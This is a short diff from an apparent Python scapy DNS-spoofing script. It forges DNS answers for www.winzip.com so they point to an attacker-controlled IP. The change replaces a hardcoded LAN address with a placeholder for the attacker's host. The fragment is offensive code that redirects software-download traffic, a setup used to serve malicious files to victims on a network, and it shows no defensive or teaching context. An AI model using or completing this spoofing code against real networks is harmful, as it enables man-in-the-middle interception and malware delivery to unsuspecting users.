@@ -42,7 +42,7 @@ def process_packet(packet):
         qname = scapy_packet[scapy.DNSQR].qname
         if "www.winzip.com" in qname:
             print("[+] Spoofing target")
-            answer = scapy.DNSRR(rrname=qname, rdata="192.168.133.150")
+            answer = scapy.DNSRR(rrname=qname, rdata="ADD IP OF HOST HERE")
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
             del scapy_packet[scapy.IP].len
